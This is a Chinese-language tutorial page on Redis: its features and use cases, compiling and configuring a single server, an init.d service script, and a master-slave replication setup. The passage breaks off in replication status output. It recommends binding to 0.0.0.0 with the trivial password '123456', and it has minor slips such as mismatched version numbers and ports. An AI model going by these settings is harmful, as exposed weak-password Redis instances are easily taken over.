<h1 id="入门简介与主从搭建"><a href="#入门简介与主从搭建" class="headerlink" title="入门简介与主从搭建"></a>入门简介与主从搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Redis 是一种基于 键值对 的 NoSQL 数据库。与很多键值对数据库不同，Redis 提供了丰富的 值数据存储结构，包括 string（字符串）、hash（哈希）、list（列表）、set（集合）、zset（有序集合）、bitmap（位图）等等。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>Redis 是一个使用 ANSI C 编写的开源、支持 网络、基于 内存、单线程模型、可选持久性 的 键值对存储数据库。</p>
<h3 id="Redis-的特性"><a href="#Redis-的特性" class="headerlink" title="Redis 的特性"></a>Redis 的特性</h3><ol>
<li>速度快，最快可达到 10w QPS（基于 内存，C 语言，单线程 架构）；</li>
<li>基于 键值对 (key/value) 的数据结构服务器。全称 Remote Dictionary Server。包括 <code>string</code>（字符串）、<code>hash</code>（哈希）、<code>list</code>（列表）、<code>set</code>（集合）、<code>zset</code>（有序集合）、<code>bitmap</code>（位图）。同时在 字符串 的基础上演变出 位图（BitMaps）和 <code>HyperLogLog</code> 两种数据结构。3.2 版本中加入 <code>GEO</code>（地理信息位置）。</li>
<li>丰富的功能。例如：键过期（缓存），发布订阅（消息队列）， Lua 脚本（自己实现 Redis 命令），事务，流水线（Pipeline，用于减少网络开销）。</li>
<li>简单稳定。无外部库依赖，单线程模型。</li>
<li>客户端语言多。</li>
<li>持久化（支持两种 持久化 方式 <strong>RDB</strong> 和 <strong>AOF</strong>）。</li>
<li>主从复制（分布式的基础）。</li>
<li>高可用（Redis Sentinel），分布式（Redis Cluster）和 水平扩容。</li>
</ol>
<h3 id="Redis-的应用场景"><a href="#Redis-的应用场景" class="headerlink" title="Redis 的应用场景"></a>Redis 的应用场景</h3><h4 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h4><p>合理的使用 缓存 能够明显加快访问的速度，同时降低数据源的压力。这也是 Redis 最常用的功能。Redis 提供了 键值过期时间（EXPIRE key seconds）设置，并且也提供了灵活控制 最大内存 和 内存溢出 后的 淘汰策略。</p>
<h4 id="排行榜"><a href="#排行榜" class="headerlink" title="排行榜"></a>排行榜</h4><p>每个网站都有自己的排行榜，例如按照 热度排名 的排行榜，发布时间 的排行榜，答题排行榜 等等。Redis 提供了 列表（list）和 有序集合（zset）数据结构，合理的使用这些数据结构，可以很方便的构建各种排行榜系统。</p>
<h4 id="计数器"><a href="#计数器" class="headerlink" title="计数器"></a>计数器</h4><p>计数器 在网站应用中非常重要。例如：点赞数加 1，浏览数 加 1。还有常用的 限流操作，限制每个用户每秒 访问系统的次数 等等。Redis 支持 计数功能（INCR key），而且计数的 性能 也非常好，计数的同时也可以设置 超时时间，这样就可以 实现限流。</p>
<h4 id="社交网络"><a href="#社交网络" class="headerlink" title="社交网络"></a>社交网络</h4><p>赞/踩，粉丝，共同好友/喜好，推送，下拉刷新等是社交网站必备的功能。由于社交网站 访问量通常比较大，而且 传统的数据库 不太适合保存这类数据，Redis 提供的 数据结构 可以相对比较容易实现这些功能。</p>
<h4 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h4><p>Redis 提供的 发布订阅（PUB/SUB）和 阻塞队列 的功能，虽然和专业的消息队列比，还 不够强大，但对于一般的消息队列功能基本满足。</p>
<h3 id="Redis-的安装配置"><a href="#Redis-的安装配置" class="headerlink" title="Redis 的安装配置"></a>Redis 的安装配置</h3><p>下面介绍一下 Redis 的安装流程。我会按照如下的顺序，逐步搭建出 高可用 的 Redis 缓存服务器集群。</p>
<ul>
<li>Redis 单机服务器 搭建</li>
<li>Redis 主从复制 搭建</li>
<li>Redis-Sentinel 高可用 搭建</li>
</ul>
<h4 id="Redis-单机服务器安装"><a href="#Redis-单机服务器安装" class="headerlink" title="Redis 单机服务器安装"></a>Redis 单机服务器安装</h4><h5 id="下载并解压"><a href="#下载并解压" class="headerlink" title="下载并解压"></a>下载并解压</h5><p>首先从 Redis 官网下载 Redis 源代码并解压，这里使用的是 最新稳定版本 4.0.11。依次执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/</span><br><span class="line">wget http://download.redis.io/releases/redis-4.0.11.tar.gz</span><br><span class="line">tar -zxvf redis-4.0.2.tar.gz</span><br></pre></td></tr></table></figure>

<h5 id="编译并安装"><a href="#编译并安装" class="headerlink" title="编译并安装"></a>编译并安装</h5><p>下载并解压完毕后，则对 源码包 进行 编译安装，这里 Redis 安装路径为 /usr/local/redis。</p>
<blockquote>
<p>注意：make install PREFIX=目标安装路径</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/redis-4.0.11</span><br><span class="line">make install PREFIX=/usr/<span class="built_in">local</span>/redis</span><br></pre></td></tr></table></figure>

<p>安装完成时，/usr/local/redis/bin 目录下会生成的几个可执行的文件。</p>
<table>
<thead>
<tr>
<th>可执行文件</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>redis-server</td>
<td>启动 redis 服务</td>
</tr>
<tr>
<td>redis-cli    redis</td>
<td>命令行客户端</td>
</tr>
<tr>
<td>redis-benchmark</td>
<td>redis 基准测试工具</td>
</tr>
<tr>
<td>redis-check-aof</td>
<td>redis AOF 持久化文件检测和修复工具</td>
</tr>
<tr>
<td>redis-check-dump</td>
<td>redis RDB 持久化文件检测和修复工具</td>
</tr>
<tr>
<td>redis-sentinel</td>
<td>启动 redis sentinel</td>
</tr>
</tbody></table>
<p>复制 Redis 相关命令到 /usr/local/bin 目录下，这样就可以直接执行这些命令，不用写全路径。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/redis/bin/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo sudo cp redis-cli redis-server redis-sentinel /usr/<span class="built_in">local</span>/bin</span></span><br></pre></td></tr></table></figure>

<h5 id="修改-Redis-配置文件"><a href="#修改-Redis-配置文件" class="headerlink" title="修改 Redis 配置文件"></a>修改 Redis 配置文件</h5><p>安装完成之后将 Redis 配置文件拷贝到 /usr/local 下，<code>redis.conf</code> 是 Redis 的配置文件，<code>redis.conf</code> 在 Redis 源码目录，port 默认是 6379。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo cp /usr/<span class="built_in">local</span>/redis-4.0.11/redis.conf /usr/<span class="built_in">local</span>/</span></span><br></pre></td></tr></table></figure>

<p>Redis 配置文件主要参数解析参考：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># redis 进程是否以守护进程的方式运行，yes 为是，no 为否(不以守护进程的方式运行会占用一个终端)。</span></span><br><span class="line">daemonize no</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定 redis 进程的 PID 文件存放位置</span></span><br><span class="line">pidfile /var/run/redis.pid</span><br><span class="line"></span><br><span class="line"><span class="comment"># redis 进程的端口号</span></span><br><span class="line">port 6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定的主机地址</span></span><br><span class="line"><span class="built_in">bind</span> 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端闲置多长时间后关闭连接，默认此参数为 0 即关闭此功能</span></span><br><span class="line">timeout 300</span><br><span class="line"></span><br><span class="line"><span class="comment"># redis 日志级别，可用的级别有 debug, verbose, notice, warning</span></span><br><span class="line">loglevel verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># log 文件输出位置，如果进程以守护进程的方式运行，此处又将输出文件设置为 stdout 的话，就会将日志信息输出到 /dev/null 里面去了</span></span><br><span class="line">logfile stdout</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置数据库的数量，默认为0可以使用 select &lt;dbid&gt; 命令在连接上指定数据库 id</span></span><br><span class="line">databases 16</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定在多少时间内刷新次数达到多少的时候会将数据同步到数据文件</span></span><br><span class="line">save &lt;seconds&gt; &lt;changes&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定存储至本地数据库时是否压缩文件，默认为 yes 即启用存储</span></span><br><span class="line">rdbcompression yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定本地数据库文件名</span></span><br><span class="line">dbfilename dump.db</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定本地数据问就按存放位置</span></span><br><span class="line">dir ./</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定当本机为 slave 服务时，设置 master 服务的 IP 地址及端口，在 redis 启动的时候他会自动跟 master 进行数据同步</span></span><br><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当 master 设置了密码保护时，slave 服务连接 master 的密码</span></span><br><span class="line">masterauth &lt;master-password&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 redis 连接密码，如果配置了连接密码，客户端在连接 redis 是需要通过 AUTH&lt;password&gt; 命令提供密码，默认关闭</span></span><br><span class="line">requirepass footbared</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置同一时间最大客户连接数，默认无限制。redis 可以同时连接的客户端数为 redis 程序可以打开的最大文件描述符，如果设置 maxclients 0，表示不作限制。当客户端连接数到达限制时，Redis 会关闭新的连接并向客户端返回 max number of clients reached 错误信息</span></span><br><span class="line">maxclients 128</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定 Redis 最大内存限制，Redis 在启动时会把数据加载到内存中，达到最大内存后，Redis 会先尝试清除已到期或即将到期的 Key。当此方法处理后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作。Redis 新的 vm 机制，会把 Key 存放内存，Value 会存放在 swap 区</span></span><br><span class="line">maxmemory&lt;bytes&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定是否在每次更新操作后进行日志记录，Redis 在默认情况下是异步的把数据写入磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。因为 redis 本身同步数据文件是按上面 save 条件来同步的，所以有的数据会在一段时间内只存在于内存中。默认为 no。</span></span><br><span class="line">appendonly no</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定跟新日志文件名默认为 appendonly.aof</span></span><br><span class="line">appendfilename appendonly.aof</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定更新日志的条件，有三个可选参数 - no：表示等操作系统进行数据缓存同步到磁盘(快)；always：表示每次更新操作后手动调用 fsync() 将数据写到磁盘(慢，安全)；everysec：表示每秒同步一次(折衷，默认值)。</span></span><br><span class="line">appendfsync everysec</span><br></pre></td></tr></table></figure>

<ul>
<li><p>设置后台启动<br>由于 Redis 默认是 前台启动，不建议使用。修改 Redis 配置文件，把 <code>daemonize no</code> 改为 <code>daemonize yes</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置远程访问<br>Redis 默认只允许 本机访问，把 <code>bind</code> 修改为 <code>bind 0.0.0.0</code> 此设置会变成 允许所有远程访问。如果想指定限制访问，可设置对应的 IP。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 0.0.0.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置 Redis 日志记录<br>找到 <code>logfile</code> 配置，默认是：<code>logfile &quot;&quot;</code>，改为自定义日志文件路径。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logfile /var/log/redis_6379.log</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置 Redis 请求密码<br>把 <code>requirepass</code> 修改为 123456，修改之后重启下服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass &quot;123456&quot;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>有了密码之后，进入客户端，就得这样访问：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h 127.0.0.1 -p 6379 -a 123456</span></span><br></pre></td></tr></table></figure>

<h5 id="Redis-的常用命令"><a href="#Redis-的常用命令" class="headerlink" title="Redis 的常用命令"></a>Redis 的常用命令</h5><ul>
<li><p>启动命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> redis-server /usr/<span class="built_in">local</span>/redis.conf</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h 127.0.0.1 -p 6379 shutdown</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看是否启动</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -ef | grep redis</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>进入客户端</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> redis-cli</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭客户端</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> redis-cli shutdown</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>注意：不建议使用 <code>kill -9</code> ，这种方式不但不会做持久化操作，还会造成缓冲区等资源不能优雅关闭。极端情况下造成 AOF 和 复制丢失数据 的情况。<code>shutdown</code> 还有一个参数，代表是否在关闭 redis 前，生成 持久化文件，命令为 <code>redis-cli shutdown nosave|save</code>。</p>
</blockquote>
<ul>
<li><p>设置为开机自动启动</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"redis-server /usr/local/redis.conf"</span> &gt;&gt; /etc/rc.local</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>开放防火墙端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加规则</span></span><br><span class="line">iptables -I INPUT -p tcp -m tcp --dport 6379 -j ACCEPT</span><br><span class="line"><span class="comment"># 保存规则</span></span><br><span class="line">service iptables save</span><br><span class="line"><span class="comment"># 重启 iptables</span></span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="注册-Redis-为系统服务"><a href="#注册-Redis-为系统服务" class="headerlink" title="注册 Redis 为系统服务"></a>注册 Redis 为系统服务</h5><p>在 /etc/init.d 目录下添加 Redis 服务的 启动，暂停 和 重启 脚本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo /etc/init.d/redis</span></span><br></pre></td></tr></table></figure>

<p>脚本的内容如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># redis - this script starts and stops the redis-server daemon  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># chkconfig:   - 85 15  </span></span><br><span class="line"><span class="comment"># description:  Redis is a persistent key-value database  </span></span><br><span class="line"><span class="comment"># processname: redis-server  </span></span><br><span class="line"><span class="comment"># config:      /usr/local/redis/bin/redis-server</span></span><br><span class="line"><span class="comment"># config:      /etc/redis.conf  </span></span><br><span class="line"><span class="comment"># Source function library.  </span></span><br><span class="line">. /etc/rc.d/init.d/<span class="built_in">functions</span>  </span><br><span class="line"><span class="comment"># Source networking configuration.  </span></span><br><span class="line">. /etc/sysconfig/network  </span><br><span class="line"><span class="comment"># Check that networking is up.  </span></span><br><span class="line">[ <span class="string">"<span class="variable">$NETWORKING</span>"</span> = <span class="string">"no"</span> ] &amp;&amp; <span class="built_in">exit</span> 0  </span><br><span class="line">redis=<span class="string">"/usr/local/redis/bin/redis-server"</span> </span><br><span class="line">prog=$(basename <span class="variable">$redis</span>)  </span><br><span class="line">REDIS_CONF_FILE=<span class="string">"/etc/redis.conf"</span> </span><br><span class="line">[ -f /etc/sysconfig/redis ] &amp;&amp; . /etc/sysconfig/redis  </span><br><span class="line">lockfile=/var/lock/subsys/redis  </span><br><span class="line"><span class="function"><span class="title">start</span></span>() &#123;  </span><br><span class="line">    [ -x <span class="variable">$redis</span> ] || <span class="built_in">exit</span> 5  </span><br><span class="line">    [ -f <span class="variable">$REDIS_CONF_FILE</span> ] || <span class="built_in">exit</span> 6  </span><br><span class="line">    <span class="built_in">echo</span> -n $<span class="string">"Starting <span class="variable">$prog</span>: "</span>  </span><br><span class="line">    daemon <span class="variable">$redis</span> <span class="variable">$REDIS_CONF_FILE</span>  </span><br><span class="line">    retval=$?  </span><br><span class="line">    <span class="built_in">echo</span>  </span><br><span class="line">    [ <span class="variable">$retval</span> -eq 0 ] &amp;&amp; touch <span class="variable">$lockfile</span>  </span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$retval</span>  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="title">stop</span></span>() &#123;  </span><br><span class="line">    <span class="built_in">echo</span> -n $<span class="string">"Stopping <span class="variable">$prog</span>: "</span>  </span><br><span class="line">    killproc <span class="variable">$prog</span> -QUIT  </span><br><span class="line">    retval=$?  </span><br><span class="line">    <span class="built_in">echo</span>  </span><br><span class="line">    [ <span class="variable">$retval</span> -eq 0 ] &amp;&amp; rm -f <span class="variable">$lockfile</span>  </span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$retval</span>  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="title">restart</span></span>() &#123;  </span><br><span class="line">    stop  </span><br><span class="line">    start  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="title">reload</span></span>() &#123;  </span><br><span class="line">    <span class="built_in">echo</span> -n $<span class="string">"Reloading <span class="variable">$prog</span>: "</span>  </span><br><span class="line">    killproc <span class="variable">$redis</span> -HUP  </span><br><span class="line">    RETVAL=$?  </span><br><span class="line">    <span class="built_in">echo</span>  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="title">force_reload</span></span>() &#123;  </span><br><span class="line">    restart  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="title">rh_status</span></span>() &#123;  </span><br><span class="line">    status <span class="variable">$prog</span>  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="title">rh_status_q</span></span>() &#123;  </span><br><span class="line">    rh_status &gt;/dev/null 2&gt;&amp;1  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span>  </span><br><span class="line">    start)  </span><br><span class="line">        rh_status_q &amp;&amp; <span class="built_in">exit</span> 0  </span><br><span class="line">        <span class="variable">$1</span>  </span><br><span class="line">        ;;  </span><br><span class="line">    stop)  </span><br><span class="line">        rh_status_q || <span class="built_in">exit</span> 0  </span><br><span class="line">        <span class="variable">$1</span>  </span><br><span class="line">        ;;  </span><br><span class="line">    restart|configtest)  </span><br><span class="line">        <span class="variable">$1</span>  </span><br><span class="line">        ;;  </span><br><span class="line">    reload)  </span><br><span class="line">        rh_status_q || <span class="built_in">exit</span> 7  </span><br><span class="line">        <span class="variable">$1</span>  </span><br><span class="line">        ;;  </span><br><span class="line">    force-reload)  </span><br><span class="line">        force_reload  </span><br><span class="line">        ;;  </span><br><span class="line">    status)  </span><br><span class="line">        rh_status  </span><br><span class="line">        ;;  </span><br><span class="line">    condrestart|try-restart)  </span><br><span class="line">        rh_status_q || <span class="built_in">exit</span> 0  </span><br><span class="line">    ;;  </span><br><span class="line">    *)  </span><br><span class="line">        <span class="built_in">echo</span> $<span class="string">"Usage: <span class="variable">$0</span> &#123;start|stop|status|restart|condrestart|try-restart|reload|orce-reload&#125;"</span>  </span><br><span class="line">        <span class="built_in">exit</span> 2  </span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>

<p>赋予脚本文件可执行权限：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod 755 /etc/init.d/redis</span></span><br></pre></td></tr></table></figure>

<p>启动、停止和重启 redis 服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service redis start</span><br><span class="line">service redis stop</span><br><span class="line">service redis restart</span><br></pre></td></tr></table></figure>

<h4 id="Redis-主从复制集群安装"><a href="#Redis-主从复制集群安装" class="headerlink" title="Redis 主从复制集群安装"></a>Redis 主从复制集群安装</h4><h5 id="Redis-Server-配置说明"><a href="#Redis-Server-配置说明" class="headerlink" title="Redis-Server 配置说明"></a>Redis-Server 配置说明</h5><table>
<thead>
<tr>
<th>角色</th>
<th>IP地址</th>
<th>端口号</th>
</tr>
</thead>
<tbody><tr>
<td>Redis Master</td>
<td>10.206.20.231</td>
<td>16379</td>
</tr>
<tr>
<td>Redis Slave</td>
<td>10.206.20.231</td>
<td>26379</td>
</tr>
</tbody></table>
<h5 id="Redis-主从架构配置"><a href="#Redis-主从架构配置" class="headerlink" title="Redis 主从架构配置"></a>Redis 主从架构配置</h5><ul>
<li><p>编辑 从机 的 Redis 配置文件，找到 210 行（大概）- <code>#slaveof &lt;masterip&gt; &lt;masterport&gt;</code> 。去掉该注释，填写 主服务器 的 IP 和 端口。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof 10.206.20.231 16379</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果 主服务器 设置了密码，还需要找到 <code>masterauth &lt;master-password&gt;</code> 这一行，去掉注释，改为 <code>masterauth</code> 的主机密码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masterauth 123456</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置完成后重启 从服务器 的 Redis 服务。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> service redis restart</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>重启完成之后，进入 主服务器 的 redis-cli 模式下，命令为 <code>redis-cli -h 127.0.0.1 -p 16379 -a 123456</code> 。输入 <code>INFO replication</code> 查询到 当前主机 的 Redis 的状态，连接上 主服务器 的 从服务器。</p>
</li>
</ul>
<p>Redis 主服务器 的配置文件：</p>
<ul>
<li>redis.conf<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">pidfile /var/run/redis-16379.pid</span><br><span class="line">logfile /var/log/redis/redis-16379.log</span><br><span class="line">port 16379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">timeout 300</span><br><span class="line">databases 16</span><br><span class="line">dbfilename dump-16379.db</span><br><span class="line">dir ./redis-workdir</span><br><span class="line">masterauth 123456</span><br><span class="line">requirepass 123456</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>Redis 从服务器 的配置文件：</p>
<ul>
<li>redis.conf<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">daemonize yes</span><br><span class="line">pidfile /var/run/redis-26379.pid</span><br><span class="line">logfile /var/log/redis/redis-26379.log</span><br><span class="line">port 26379</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">timeout 300</span><br><span class="line">databases 16</span><br><span class="line">dbfilename dump-26379.db</span><br><span class="line">dir ./redis-workdir</span><br><span class="line">masterauth 123456</span><br><span class="line">requirepass 123456</span><br><span class="line">slaveof 127.0.0.1 16379</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>Redis 主服务器 的状态如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Replication</span></span><br><span class="line">role:master</span><br><span class="line">connected_slaves:1</span><br><span class="line">slave0:ip=10.206.20.231,port=16379,state=online,offset=28,lag=1</span><br><span class="line">master_replid:625ae9f362643da5337835beaeabfdca426198c7</span><br><span class="line">master_replid2:0000000000000000000000000000000000000000</span><br><span class="line">master_repl_offset:28</span><br><span class="line">second_repl_offset:-1</span><br><span class="line">repl_backlog_active:1</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:1</span><br><span 